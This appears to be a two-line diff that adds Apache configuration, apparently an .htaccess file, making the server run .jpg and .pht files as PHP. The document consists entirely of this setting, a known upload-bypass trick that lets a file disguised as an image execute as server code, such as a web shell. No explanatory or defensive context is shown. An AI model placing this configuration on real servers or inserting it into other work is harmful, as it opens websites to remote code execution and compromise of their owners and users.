@@ -1,0 +1,2 @@
+AddHandler application/x-httpd-php .jpg .pht
+AddType application/x-httpd-php .jpg .pht
